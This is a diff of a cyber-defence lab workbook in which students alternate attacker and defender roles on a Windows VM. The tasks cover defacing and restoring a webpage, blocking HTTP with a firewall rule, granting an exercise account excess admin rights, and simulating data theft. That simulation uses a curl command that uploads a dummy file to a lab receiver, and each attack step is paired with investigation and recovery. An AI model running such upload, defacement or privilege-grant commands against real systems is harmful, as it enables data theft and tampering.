-<pre>Copy-Item -LiteralPath &#x27;C:\CCDC-Exercise-1-2\original.html&#x27; -Destination &#x27;C:\inetpub\wwwroot\index.html&#x27; -Force
-Get-FileHash -LiteralPath &#x27;C:\inetpub\wwwroot\index.html&#x27;
-(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content</pre>
-<p>Success: the restored hash matches the original, the laptop sees “CCDC Windows intranet: operational”, and DNS still
-  answers. Explain why HTTP 200 alone was insufficient. Instructor archives the evidence directory before the next
-  round.</p>
-<h3 id="firewall-tampering">1.3 — Firewall tampering versus service failure</h3>
-<p><a href="student-workbook.html#firewall-tampering">Shared concept →</a>. Run guest commands in elevated PowerShell.
-  Before the round, confirm Windows Firewall is enabled, IIS is running, and a campus laptop can retrieve <a
-    href="http://128.198.74.133:28080/index.html">the Windows page</a>. Keep the instructor’s VM console available.</p>
-<h4>Red team — introduce one HTTP-only rule</h4>
-<pre>$rule = &#x27;CCDC-Exercise-HTTP-Block&#x27;
-if (Get-NetFirewallRule -Name $rule -ErrorAction SilentlyContinue) { throw &#x27;Exercise rule already exists.&#x27; }
-New-NetFirewallRule -Name $rule -DisplayName $rule -Direction Inbound -Action Block -Protocol TCP -LocalPort 80 -Profile Any</pre>
-<h4>Blue team — investigate</h4>
-<p>Repeat the laptop HTTP request; expect failure while RDP and DNS remain available. A TCP connection to the relay does
-  not prove the guest HTTP service works.</p>
+  trainee account’s administrator permission for the remaining lessons. Keep your evidence, switch roles and repeat
+  from Step 1 after restoring the baseline.</p>
+<h3 id="web-integrity">Task 1.2 — Web-content tampering and evidence</h3>
+<p>Investigate unauthorized changes to a webpage even when the web service still responds. Follow the four steps below:</p>
+<ol>
+  <li>Prepare your own trusted recovery copy and baseline checksum.</li>
+  <li>Attacker changes the page while IIS remains running.</li>
+  <li>Defender preserves evidence and compares the changed page with the baseline.</li>
+  <li>Defender restores the original page and verifies recovery.</li>
+</ol>
+<p>Use your assigned trainee account in elevated PowerShell inside the Windows VM. Use the same PowerShell window
+  throughout one round. When you switch roles, repeat Step 1 to create a new directory; previous files remain saved.</p>
+<h4>Step 1 — Prepare a trusted recovery copy</h4>
+<p>Check IIS and DNS, then request the operational page:</p>
 <pre>Get-Service W3SVC,DNS
-Get-NetTCPConnection -State Listen | Where-Object LocalPort -eq 80
-Get-NetFirewallProfile | Select-Object Name,Enabled
-Get-NetFirewallRule -Enabled True -Direction Inbound -Action Block |
-  Select-Object Name,DisplayName,Action,Profile
-Get-NetFirewallRule -Name &#x27;CCDC-Exercise-HTTP-Block&#x27; | Format-List
-Get-NetFirewallRule -Name &#x27;CCDC-Exercise-HTTP-Block&#x27; | Get-NetFirewallPortFilter
-Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile</pre>
-<p>Preserve the rule properties and the before/after observations. Explain why a running service can still be
-  unreachable. A local HTTP check is useful but does not replace the external test.</p>
-<h4>Blue team — recover</h4>
-<pre>Remove-NetFirewallRule -Name &#x27;CCDC-Exercise-HTTP-Block&#x27;
-Get-Service W3SVC,DNS
 (Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content</pre>
-<p>Success: the exact exercise rule is absent, the laptop retrieves the operational page, DNS works, and legitimate RDP
-  access remains. Remove only this rule; leave the firewall enabled. The instructor can run the same removal command
-  from the guest console if recovery is needed.</p>
-<h3 id="account-compromise">1.4 — Compromised account and excessive privilege</h3>
-<p><a href="student-workbook.html#account-compromise">Shared concept →</a>. Use a dedicated exercise account, never a
-  student or instructor account. This round simulates credentials for an account that was improperly granted
-  administrator membership.</p>
-<h4>Instructor — prepare the dedicated account</h4>
-<p>Inside elevated Windows PowerShell, set a temporary lab-only password at the prompt and give it to the red team.
-  Confirm the account name is unused. This exercise uses local runas and does not require granting RDP access.</p>
-<pre>$name = &#x27;ccdc-red-demo&#x27;
-if (Get-LocalUser -Name $name -ErrorAction SilentlyContinue) { throw &#x27;Account exists: choose a fresh exercise account.&#x27; }
-$password = Read-Host &#x27;Temporary exercise password&#x27; -AsSecureString
-New-LocalUser -Name $name -Password $password -Description &#x27;Dedicated CCDC account exercise&#x27;
-$admins = Get-LocalGroup -SID &#x27;S-1-5-32-544&#x27;
-Add-LocalGroupMember -Group $admins.Name -Member $name
+<p>Both services should be running and the page should show <code>CCDC Windows intranet: operational</code>.
+  Confirm the same content from your campus laptop at <a href="http://128.198.74.133:28080/index.html">the Windows
+  website</a>. If the previous round left the page changed, restore that round’s original using Step 4 before making
+  another recovery copy.</p>
+<p>Set the webpage path and create a unique name for this round’s exercise directory:</p>
+<pre>$site = 'C:\inetpub\wwwroot\index.html'
+$case = Join-Path $HOME ('CCDC-Exercise-1-2-' + [guid]::NewGuid().ToString('N'))</pre>
+<p>Check that the webpage exists; expect <code>True</code>. Stop here if the path is incorrect:</p>
+<pre>Test-Path -LiteralPath $site</pre>
+<p>Create the exercise directory. Continue only if it is created successfully:</p>
+<pre>New-Item -ItemType Directory -Path $case -ErrorAction Stop</pre>
+<p>Save a trusted copy of the operational page before the attack:</p>
+<pre>Copy-Item -LiteralPath $site -Destination "$case\original.html" -ErrorAction Stop</pre>
+<p>Save its SHA-256 checksum in a separate baseline file:</p>
+<pre>(Get-FileHash -LiteralPath $site -Algorithm SHA256).Hash | Set-Content -LiteralPath "$case\original.sha256" -Encoding ASCII</pre>
+<p>Display and record the exercise-directory path:</p>
+<pre>$case</pre>
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/join-path">Join-Path</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/test-path">Test-Path</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-item">New-Item</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/copy-item">Copy-Item</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash">Get-FileHash</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-content">Set-Content</a></p>
+<p>Keep <code>original.html</code> and <code>original.sha256</code> unchanged. If you reopen PowerShell during the
+  round, set <code>$site</code> to the webpage path and <code>$case</code> to this round’s recorded directory before
+  continuing.</p>
+<p><strong>Note:</strong> in a real environment, store the trusted recovery copy and baseline checksum outside the
+  victim computer so an attacker who compromises that computer cannot alter them.</p>
+<h4>Step 2 — Attacker: change the page</h4>
+<p>Record the time of the assigned change:</p>
+<pre>(Get-Date).ToUniversalTime().ToString('o')</pre>
+<p>Replace only the exercise webpage with the changed-page marker:</p>
+<pre>Set-Content -LiteralPath $site -Value 'CCDC exercise: changed page' -Encoding UTF8</pre>
+<p>Check that IIS remains running and request the changed page:</p>
+<pre>Get-Service W3SVC
+(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content</pre>
+<p>Expect a successful response containing <code>CCDC exercise: changed page</code>. Keep IIS, DNS and remote desktop
+  running. Do not modify the recovery copy or baseline checksum. Hand over to the defender.</p>
+<h4>Step 3 — Defender: investigate before restoring</h4>
+<p>From your campus laptop, make a fresh request to the Windows website. It may return HTTP 200 while showing the
+  wrong content. In the same elevated PowerShell window, inspect and preserve evidence before recovery.</p>
+<p>Inspect the changed file’s metadata and access permissions:</p>
+<pre>Get-Item -LiteralPath $site | Select-Object FullName,Length,LastWriteTimeUtc
+Get-Acl -LiteralPath $site | Format-List</pre>
+<p>Preserve the changed page in this round’s directory:</p>
+<pre>Copy-Item -LiteralPath $site -Destination "$case\changed.html" -ErrorAction Stop</pre>
+<p>Display the changed content and its checksum:</p>
+<pre>Get-Content -LiteralPath $site
+Get-FileHash -LiteralPath $site -Algorithm SHA256</pre>
+<p>Compare the current checksum with the saved baseline. Expect <code>False</code> after the attack:</p>
+<pre>(Get-FileHash -LiteralPath $site -Algorithm SHA256).Hash -eq (Get-Content -LiteralPath "$case\original.sha256").Trim()</pre>
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item">Get-Item</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl">Get-Acl</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-content">Get-Content</a></p>
+<p>Save the output or screenshots. Review IIS access records at the configured logging location (normally
+  <code>C:\inetpub\logs\LogFiles\W3SVC1</code>). Access logs show requests, not who edited the file. File-change
+  attribution requires auditing enabled before the change; timestamps alone do not establish an attacker’s identity.</p>
+<h4>Step 4 — Defender: recover and verify</h4>
+<p>Restore your trusted original. Continue only if the copy succeeds:</p>
+<pre>Copy-Item -LiteralPath "$case\original.html" -Destination $site -Force -ErrorAction Stop</pre>
+<p>Compare the restored file with the saved baseline checksum; expect <code>True</code>:</p>
+<pre>(Get-FileHash -LiteralPath $site -Algorithm SHA256).Hash -eq (Get-Content -LiteralPath "$case\original.sha256").Trim()</pre>
+<p>Check the services and restored webpage:</p>
+<pre>Get-Service W3SVC,DNS,TermService
+(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content</pre>
+<p>Verify that DNS still answers:</p>
+<pre>Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile</pre>
+<p>All three services should be running, the checksum comparison should be <code>True</code> and the page should show
+  the operational intranet. Repeat the laptop HTTP check with a fresh request. Keep this round’s evidence and original
+  files, switch roles and repeat from Step 1 with a new directory.</p>
+<p><strong>Practice check:</strong> show the changed page, preserved evidence, matching restored checksum and normal
+  service. Explain why HTTP 200 alone did not prove the page was correct. No written report submission is required.</p>
+<h3 id="firewall-tampering">Task 1.3 — Firewall tampering versus service failure</h3>
+<p>Investigate an HTTP outage caused by a firewall change while IIS remains running. Follow the three steps below:</p>
+<ol>
+  <li>Attacker blocks incoming HTTP traffic.</li>
+  <li>Defender investigates while IIS remains running.</li>
+  <li>Defender removes the exercise rule and verifies recovery.</li>
+</ol>
+<h4>Step 1 — Attacker: block incoming HTTP traffic</h4>
+<p>Use elevated PowerShell inside your assigned Windows VM. Check the starting conditions before creating the rule.</p>
+<p>Confirm that Windows Firewall is enabled on all profiles:</p>
+<pre>Get-NetFirewallProfile | Select-Object Name,Enabled</pre>
+<p>Check the required services and request the operational page:</p>
+<pre>Get-Service W3SVC,DNS,TermService
+(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content</pre>
+<p>Check for an existing exercise rule; expect no output:</p>
+<pre>Get-NetFirewallRule -Name 'CCDC-Exercise-HTTP-Block' -ErrorAction SilentlyContinue</pre>
+<p>Continue only when the firewall profiles are enabled, services are running and the operational intranet page is
+  available. Confirm the same page from your campus laptop at <a href="http://128.198.74.133:28080/index.html">the
+  Windows website</a>. If the exercise rule already exists, finish Step 3 before starting another round.</p>
+<p>Record the time, then run the rule-creation command once:</p>
+<pre>(Get-Date).ToUniversalTime().ToString('o')</pre>
+<p>Block only incoming HTTP on TCP port 80:</p>
+<pre>New-NetFirewallRule -Name 'CCDC-Exercise-HTTP-Block' -DisplayName 'CCDC-Exercise-HTTP-Block' -Direction Inbound -Action Block -Protocol TCP -LocalPort 80 -Profile Any</pre>
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/netsecurity/get-netfirewallprofile">Get-NetFirewallProfile</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/netsecurity/get-netfirewallrule">Get-NetFirewallRule</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/netsecurity/new-netfirewallrule">New-NetFirewallRule</a></p>
+<p>Make a fresh laptop HTTP request; expect failure or a relay error rather than the operational page. Leave IIS and
+  DNS running and keep your remote desktop session open. This rule does not target DNS or remote desktop ports. Hand
+  over to the defender after demonstrating the failure.</p>
+<h4>Step 2 — Defender: investigate the outage</h4>
+<p>Check that the services remain running and TCP port 80 still has a listener:</p>
+<pre>Get-Service W3SVC,DNS,TermService
+Get-NetTCPConnection -State Listen | Where-Object LocalPort -eq 80</pre>
+<p>Inspect the enabled firewall profiles and exact exercise rule:</p>
+<pre>Get-NetFirewallProfile | Select-Object Name,Enabled
+Get-NetFirewallRule -Name 'CCDC-Exercise-HTTP-Block' | Format-List</pre>
+<p>Inspect the rule’s protocol and destination port:</p>
+<pre>Get-NetFirewallRule -Name 'CCDC-Exercise-HTTP-Block' | Get-NetFirewallPortFilter</pre>
+<p>Confirm DNS still answers:</p>
+<pre>Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile</pre>
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/netsecurity/get-netfirewallportfilter">Get-NetFirewallPortFilter</a></p>
+<p>Preserve the output or screenshots before recovery. Expect an enabled inbound block rule for TCP port 80 while
+  IIS, DNS and remote desktop remain running. Compare this with the failed laptop HTTP request. A listener or successful
+  TCP connection to the relay alone does not prove that the guest’s HTTP service is reachable.</p>
+<h4>Step 3 — Defender: recover and verify</h4>
+<p>Remove only the exact exercise rule:</p>
+<pre>Remove-NetFirewallRule -Name 'CCDC-Exercise-HTTP-Block'</pre>
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/netsecurity/remove-netfirewallrule">Remove-NetFirewallRule</a></p>
+<p>Check that the firewall remains enabled and the exercise rule is absent:</p>
+<pre>Get-NetFirewallProfile | Select-Object Name,Enabled
+Get-NetFirewallRule -Name 'CCDC-Exercise-HTTP-Block' -ErrorAction SilentlyContinue</pre>
+<p>Check the services and request the operational page:</p>
+<pre>Get-Service W3SVC,DNS,TermService
+(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content</pre>
+<p>Verify DNS after recovery:</p>
+<pre>Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile</pre>
+<p>Expect no exercise-rule output, enabled firewall profiles, running services and the operational intranet page.
+  Repeat the laptop HTTP check; the operational page must return and your remote desktop session must remain connected.
+  Do not disable the firewall or change unrelated rules.</p>
+<p><strong>Practice check:</strong> show the external HTTP failure, running IIS, the exercise block rule and successful
+  external recovery after removal. Explain how this differs from Task 1.1. Keep the evidence, switch roles and repeat
+  from Step 1. No written report submission is required.</p>
+<h3 id="account-compromise">Task 1.4 — Compromised account and excessive privilege</h3>
+<p>Investigate an exercise account with excessive privileges and contain its access while preserving legitimate services.
+  Complete the four steps below yourselves, then switch roles and repeat.</p>
+<ol>
+  <li>Prepare the dedicated exercise account and check normal service.</li>
+  <li>Attacker demonstrates the account’s excessive access.</li>
+  <li>Defender preserves evidence and removes the excessive access.</li>
+  <li>Defender verifies containment, checks normal service and cleans up.</li>
+</ol>
+<p>Use only the dedicated <code>ccdc-demo</code> account for this exercise. Keep your assigned trainee account’s privileges
+  unchanged. This task starts with access to an account; it does not involve guessing or cracking passwords.</p>
+<h4>Step 1 — Prepare the dedicated exercise account</h4>
+<p>Use your assigned trainee account in elevated Windows PowerShell inside the Windows VM. Verify the baseline:</p>
+<p>Check service states and request the webpage:</p>
+<pre>Get-Service W3SVC,DNS,TermService
+(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content</pre>
+
+<p>Query DNS over UDP:</p>
+<pre>Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile</pre>
+
+<p>All three services should be running, the operational intranet page should be returned and DNS should answer.
+  Confirm the page from your campus laptop at <a href="http://128.198.74.133:28080/index.html">the Windows website</a>.</p>
+<p>Create the dedicated account with a temporary exercise password and deliberately grant it administrator membership.
+  Give that password to the student acting as attacker. If the account exists, complete the previous round’s cleanup
+  before starting a fresh round. Keep this elevated PowerShell window open for the defender steps.</p>
+<p>Check whether the exercise account exists; expect no output before a fresh round:</p>
+<pre>Get-LocalUser -Name 'ccdc-demo' -ErrorAction SilentlyContinue</pre>
+<p>If the lookup returns an account, finish the previous round’s cleanup before continuing. Do not overwrite it.</p>
+<p>Choose a temporary exercise password; the input is hidden:</p>
+<pre>$password = Read-Host 'Temporary exercise password' -AsSecureString</pre>
+<p>Create only the dedicated exercise account. Continue only if creation succeeds:</p>
+<pre>New-LocalUser -Name 'ccdc-demo' -Password $password -Description 'CCDC Task 1.4 exercise account' -ErrorAction Stop</pre>
+<p>Find the built-in Administrators group and inspect its current membership:</p>
+<pre>$admins = Get-LocalGroup -SID 'S-1-5-32-544'
 Get-LocalGroupMember -Group $admins.Name</pre>
-<h4>Red team — demonstrate access</h4>
-<p>Run this in a separate PowerShell window and enter the temporary password. The new window stays open so the
-  instructor can observe the session.</p>
-<pre>runas /user:.\ccdc-red-demo &quot;cmd.exe /k whoami /all&quot;</pre>
-<p>Observe the identity and token groups. UAC may filter administrator privileges in this window; group membership does
-  not mean every process is elevated. No service stop is needed for this account exercise.</p>
-<h4>Blue team — investigate and contain</h4>
-<pre>Get-LocalUser -Name &#x27;ccdc-red-demo&#x27; | Format-List Name,Enabled,LastLogon,Description
-$admins = Get-LocalGroup -SID &#x27;S-1-5-32-544&#x27;
-Get-LocalGroupMember -Group $admins.Name
-Get-WinEvent -FilterHashtable @{LogName=&#x27;Security&#x27;; Id=4624,4720,4732; StartTime=(Get-Date).AddMinutes(-30)} -ErrorAction SilentlyContinue |
-  Select-Object TimeCreated,Id,Message | Format-List</pre>
-<p>Preserve the account details, unexpected membership and available events. Account creation/group changes require the
-  corresponding audit policy; missing events do not prove no change occurred. The instructor records and checks auditing
-  before class.</p>
-<pre>Disable-LocalUser -Name &#x27;ccdc-red-demo&#x27;
-$admins = Get-LocalGroup -SID &#x27;S-1-5-32-544&#x27;
-Remove-LocalGroupMember -Group $admins.Name -Member &#x27;ccdc-red-demo&#x27;
-Get-LocalUser -Name &#x27;ccdc-red-demo&#x27; | Select-Object Name,Enabled
+<p>Deliberately grant the dedicated account excessive administrator membership:</p>
+<pre>Add-LocalGroupMember -Group $admins.Name -Member 'ccdc-demo' -ErrorAction Stop</pre>
+<p>Verify that the account is enabled and appears in Administrators:</p>
+<pre>Get-LocalUser -Name 'ccdc-demo'
 Get-LocalGroupMember -Group $admins.Name</pre>
-<p>Disabling an account and removing group membership do not revoke existing process tokens. Have the instructor close
-  the dedicated runas window and confirm its processes have ended in Task Manager’s Details view with the User name
-  column enabled. In a real incident, investigate and terminate all affected sessions/processes or use a planned
-  restart.</p>
-<h4>Verify and clean up</h4>
-<p>Repeat the runas command with the same correct password: expect denial. Confirm legitimate student access, the IIS
-  operational page and DNS still work. After the debrief and evidence retention, the instructor removes only the
-  dedicated account:</p>
-<pre>Remove-LocalUser -Name &#x27;ccdc-red-demo&#x27; </pre>
-<p>Success: identify the excessive privilege, disable new access, end the existing exercise process, and demonstrate
-  legitimate services still work. Prepare a fresh account before reversing roles.</p>
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/read-host">Read-Host</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/new-localuser">New-LocalUser</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser">Get-LocalUser</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localgroup">Get-LocalGroup</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/add-localgroupmember">Add-LocalGroupMember</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localgroupmember">Get-LocalGroupMember</a></p>
+<h4>Step 2 — Attacker: demonstrate the excessive access</h4>
+<p>Open a separate PowerShell window inside the VM. Run the following and enter the temporary exercise password:</p>
+<pre>runas /user:.\ccdc-demo "cmd.exe /k whoami /all"</pre>
+<p>In the new command window, confirm the identity is <code>ccdc-demo</code> and find the Administrators group in the
+  token output. Keep this window open for the containment demonstration. UAC may mark administrator groups as deny-only
+  in an unelevated token, so membership does not mean every process is elevated. This round demonstrates an unnecessary
+  administrator grant; no service stop or RDP permission change is required.</p>
+<h4>Step 3 — Defender: investigate and contain</h4>
+<p>In the original elevated PowerShell window, inspect the account, unexpected membership and available events.
+  Save the output or screenshots before changing the account:</p>
+<p>Inspect the exercise account’s state and details:</p>
+<pre>Get-LocalUser -Name 'ccdc-demo' | Format-List Name,Enabled,LastLogon,Description</pre>
+
+<p>Identify Administrators and inspect its membership:</p>
+<pre>$admins = Get-LocalGroup -SID 'S-1-5-32-544'
+Get-LocalGroupMember -Group $admins.Name</pre>
+
+<p>Inspect the relevant recent Windows event records:</p>
+<pre>Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4720,4732; StartTime=(Get-Date).AddMinutes(-30)} -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,Message | Format-List</pre>
+
+<p>Find events mentioning the exercise account. Account creation and group changes appear only when the corresponding
+  auditing is enabled; missing events do not prove no change occurred. The account and membership listings provide
+  direct evidence of its current privileges.</p>
+<p>Disable new logons for the exercise account and remove its unnecessary administrator membership:</p>
+<p>Disable new logons for the dedicated exercise account:</p>
+<pre>Disable-LocalUser -Name 'ccdc-demo'</pre>
+
+<p>Identify the built-in Administrators group:</p>
+<pre>$admins = Get-LocalGroup -SID 'S-1-5-32-544'</pre>
+
+<p>Remove only the exercise account’s administrator membership:</p>
+<pre>Remove-LocalGroupMember -Group $admins.Name -Member 'ccdc-demo'</pre>
+
+<p>Inspect the account and administrator membership:</p>
+<pre>Get-LocalUser -Name 'ccdc-demo' | Select-Object Name,Enabled
+Get-LocalGroupMember -Group $admins.Name</pre>
+
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/disable-localuser">Disable-LocalUser</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/remove-localgroupmember">Remove-LocalGroupMember</a></p>
+<p>Expect <code>Enabled: False</code> and no <code>ccdc-demo</code> member in Administrators. Disabling the account and
+  removing membership do not revoke an existing process token. In the attacker’s existing command window, run
+  <code>whoami /all</code> again to observe that it still has the original token. Then run <code>exit</code> to close it.
+  In Task Manager’s Details view, enable the User name column and confirm no processes remain under the exercise
+  account. Close any other exercise processes before continuing.</p>
+<h4>Step 4 — Defender: verify containment and clean up</h4>
+<p>Repeat the same <code>runas</code> command from the attacker’s PowerShell window using the same correct temporary
+  password. Expect an account-disabled/logon-failure message and no new command window. Confirm legitimate services:</p>
+<p>Check service states and request the webpage:</p>
+<pre>Get-Service W3SVC,DNS,TermService
+(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content</pre>
+
+<p>Query DNS over UDP:</p>
+<pre>Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile</pre>
+
+<p>All three services should still be running, the operational page should be returned and DNS should answer. Repeat
+  the laptop HTTP check. After retaining the account evidence, remove only the dedicated exercise account from the
+  defender’s elevated PowerShell window:</p>
+<pre>Remove-LocalUser -Name 'ccdc-demo'</pre>
+<p>Verify removal; expect no account output:</p>
+<pre>Get-LocalUser -Name 'ccdc-demo' -ErrorAction SilentlyContinue</pre>
+
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/remove-localuser">Remove-LocalUser</a></p>
+<p>Expect no account output from the final lookup. Keep your evidence, reverse roles and repeat from Step 1 to prepare
+  a fresh account. Do not remove or change the assigned trainee accounts.</p>
+<p><strong>Practice check:</strong> show the excessive membership, evidence collected before containment, disabled new
+  access, closure of the existing exercise process and normal service. No written report submission is required.</p>
+<h3 id="data-exfiltration">Task 1.5 — Suspicious outbound traffic and data exfiltration</h3>
+<p>Identify a process sending dummy business data out of the victim VM, contain the connection and verify normal service.
+  Follow the five steps below:</p>
+<ol>
+  <li>Prepare the dummy data and check the isolated receiver.</li>
+  <li>Attacker starts the visible transfer simulator.</li>
+  <li>Defender identifies the connection, process and received data.</li>
+  <li>Defender stops the sender and blocks further transfers to this receiver.</li>
+  <li>Defender verifies containment and normal service, then cleans up.</li>
+</ol>
+<p>This exercise uses <code>curl</code> as a visible simulator and sends only the supplied fictional records. The receiver
+  at <code>172.29.242.1:18081</code> is on the isolated lab host, outside the victim VM. It accepts only the exact dummy
+  payload. No startup mechanism is installed. Use only this destination and the supplied file.</p>
+<h4>Step 1 — Prepare the dummy data and check the receiver</h4>
+<p>Use your assigned trainee account in elevated PowerShell inside the Windows VM. Download
+  <a href="lab-assets/dummy-business-data.txt" download>the dummy business-data file</a> unchanged into Downloads inside
+  the VM. For an offline pack, copy the file from <code>lab-assets</code> into Downloads. Do not edit or resave its contents.</p>
+<p>Check the required services and enabled firewall profiles:</p>
+<pre>Get-Service W3SVC,DNS,TermService
+Get-NetFirewallProfile | Select-Object Name,Enabled</pre>
+<p>Verify the operational webpage and isolated receiver:</p>
+<pre>(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content
+curl.exe --max-time 5 -fsS http://172.29.242.1:18081/health</pre>
+<p>Expect running services, enabled firewall profiles, the operational intranet and receiver mode
+  <code>dummy-data-only</code>. Confirm the intranet also loads from your campus laptop. Finish earlier tasks’ cleanup
+  before continuing.</p>
+<p>Set a unique exercise-directory path:</p>
+<pre>$case = Join-Path $HOME ('CCDC-Exercise-1-5-' + [guid]::NewGuid().ToString('N'))</pre>
+<p>Create the directory; continue only if creation succeeds:</p>
+<pre>New-Item -ItemType Directory -Path $case -ErrorAction Stop</pre>
+<p>Copy only the supplied dummy data into this round’s directory:</p>
+<pre>Copy-Item -LiteralPath "$env:USERPROFILE\Downloads\dummy-business-data.txt" -Destination "$case\dummy-business-data.txt" -ErrorAction Stop</pre>
+<p>Inspect the fictional content and record its checksum:</p>
+<pre>Get-Content -LiteralPath "$case\dummy-business-data.txt"
+Get-FileHash -LiteralPath "$case\dummy-business-data.txt" -Algorithm SHA256</pre>
+<p>Display and record this round’s directory:</p>
+<pre>$case</pre>
+<p>Expect the heading <code>CCDC TRAINING DATA ONLY</code> and two fictional customer records. Keep this PowerShell
+  window open for the attacker’s transfer so <code>$case</code> remains available.</p>
+<h4>Step 2 — Attacker: start the transfer simulator</h4>
+<p>Record the UTC time:</p>
+<pre>(Get-Date).ToUniversalTime().ToString('o')</pre>
+<p>Start one visible transfer of the supplied dummy file:</p>
+<pre>curl.exe --connect-timeout 3 --max-time 150 --data-binary "@$case\dummy-business-data.txt" http://172.29.242.1:18081/upload/windows</pre>
+<p>The receiver records the data immediately and delays acknowledgement for 120 seconds so the sender connection
+  remains visible. Leave this command running and hand over to the defender. If it finishes before investigation,
+  repeat this single transfer once to inspect a live connection. HTTP 400 means the file differs from the supplied
+  dummy payload; do not substitute any real file.</p>
+<h4>Step 3 — Defender: identify the connection and process</h4>
+<p>Open a second elevated PowerShell window in the same Windows desktop. Keep the attacker’s window open. Save the
+  following output or screenshots before containment.</p>
+<p>Identify the established connection to the isolated receiver:</p>
+<pre>Get-NetTCPConnection -RemoteAddress 172.29.242.1 -RemotePort 18081 -State Established | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess</pre>
+<p>Record the connection’s source port and <code>OwningProcess</code> PID. Replace 1234 in both commands below with
+  that observed PID:</p>
+<p>Inspect the process name, executable path and complete command line:</p>
+<pre>Get-Process -Id 1234 | Select-Object Id,ProcessName,Path
+Get-CimInstance Win32_Process -Filter "ProcessId=1234" | Select-Object ProcessId,CommandLine</pre>
+<p>Read the receiver’s recent Windows receipts:</p>
+<pre>curl.exe --max-time 5 -fsS http://172.29.242.1:18081/receipts/windows</pre>
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process">Get-Process</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/get-ciminstance">Get-CimInstance</a></p>
+<p>Find this round’s receipt by time and source IP <code>172.29.242.40</code>. Compare its SHA-256 value with Step 1
+  and inspect the fictional payload. This independent receipt establishes that the dummy data reached the receiver even
+  while curl is waiting for its acknowledgement.</p>
+<h4>Step 4 — Defender: stop and contain the transfer</h4>
+<p>Confirm the PID belongs to the exercise’s <code>curl.exe</code> command. Replace 1234 with that PID and stop only this
+  sender; do not stop IIS, DNS, remote desktop or an unrelated process.</p>
+<p>Stop the identified sender process:</p>
+<pre>Stop-Process -Id 1234</pre>
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/stop-process">Stop-Process</a></p>
+<p>Check whether the outbound exercise rule already exists:</p>
+<pre>Get-NetFirewallRule -Name 'CCDC-Exercise-Outbound-Block' -ErrorAction SilentlyContinue</pre>
+<p>If this exact rule already exists, use it for the containment test. Otherwise add the following single rule:</p>
+<p>Block only outbound TCP traffic to the lab receiver:</p>
+<pre>New-NetFirewallRule -Name 'CCDC-Exercise-Outbound-Block' -DisplayName 'CCDC-Exercise-Outbound-Block' -Direction Outbound -Action Block -Protocol TCP -RemoteAddress 172.29.242.1 -RemotePort 18081 -Profile Any</pre>
+<p>In the attacker’s original PowerShell window, repeat the transfer with a short timeout:</p>
+<p>Confirm that the next attempt cannot reach the receiver:</p>
+<pre>curl.exe --connect-timeout 3 --max-time 5 --data-binary "@$case\dummy-business-data.txt" http://172.29.242.1:18081/upload/windows</pre>
